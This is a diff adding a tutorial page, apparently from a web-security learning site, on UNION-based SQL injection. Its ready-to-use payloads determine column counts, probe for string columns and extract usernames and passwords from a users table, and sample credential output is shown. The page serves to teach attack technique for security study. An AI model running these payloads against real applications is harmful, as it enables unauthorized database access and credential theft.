@@ -1,0 +1,120 @@
+---
+title: "SQL Injection UNION Attacks"
+description: "Use UNION to retrieve data from other database tables via SQL injection."
+---
+
+The `UNION` keyword lets you append additional `SELECT` queries to the original, retrieving data from other tables:
+
+```sql
+SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+```
+
+Returns a single result set with values from both tables.
+
+Two requirements must be met for UNION to work:
+
+- Both queries must return the **same number of columns**
+- Column **data types must be compatible** between queries
+
+To pull this off you need to determine:
+
+1. How many columns the original query returns
+2. Which of those columns can hold string data (to display your exfiltrated results)
+
+## Determining the Number of Columns
+
+Two methods to find the column count:
+
+### Method 1 — ORDER BY incrementing:
+
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--  ← error here means 2 columns
+```
+
+```
+The ORDER BY position number 3 is out of range of the number of items in the select list.
+```
+
+### Method 2 — UNION SELECT NULL:
+
+```sql
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--  ← no error means 3 columns
+```
+
+```
+All queries combined using a UNION, INTERSECT or EXCEPT operator
+must have an equal number of expressions in their target lists.
+```
+
+`NULL` is used because it's compatible with every data type, maximizing the chance the payload succeeds. When the count matches, the database returns an extra row of nulls — look for any detectable difference in the response, whether that's extra content, a different error, or a change in page structure.
+
+## Database-Specific Syntax
+
+Two notable exceptions to standard syntax:
+
+- **Oracle** — every `SELECT` needs a `FROM`, use the built-in `dual` table:
+
+```sql
+' UNION SELECT NULL FROM DUAL--
+```
+
+- **MySQL** — `--` must be followed by a space, or use `#` instead:
+
+```sql
+' UNION SELECT NULL--  ← needs a space after --
+' UNION SELECT NULL#
+```
+
+## Finding Columns with a Useful Data Type
+
+Once you know the column count, probe each column for string compatibility by placing `'a'` into one column at a time:
+
+```sql
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+```
+
+A type mismatch throws an error like:
+
+```
+Conversion failed when converting the varchar value 'a' to data type int.
+```
+
+If no error occurs and the response contains `a`, that column can hold string data and is usable for exfiltration.
+
+## Retrieving Interesting Data
+
+With column count and string-compatible columns confirmed, you can pull real data. Given:
+
+- Original query returns **2 string columns**
+- Database has a `users` table with `username` and `password` columns
+
+```sql
+' UNION SELECT username, password FROM users--
+```
+
+If you don't know the table/column names yet, you'll need to enumerate the database structure first — covered in Examining the database.
+
+## Retrieving Multiple Values Within a Single Column
+
+When only one string-compatible column is available, concatenate multiple values into it:
+
+```sql
+' UNION SELECT username || '~' || password FROM users--
+```
+
+`||` is Oracle's concatenation operator; `~` is just a separator so you can split the values apart. The response returns all credentials in one column:
+
+```
+administrator~s3cure
+wiener~peter
+carlos~montoya
+```
+
+Concatenation syntax varies by database — check the SQL injection cheat sheet for other platforms.
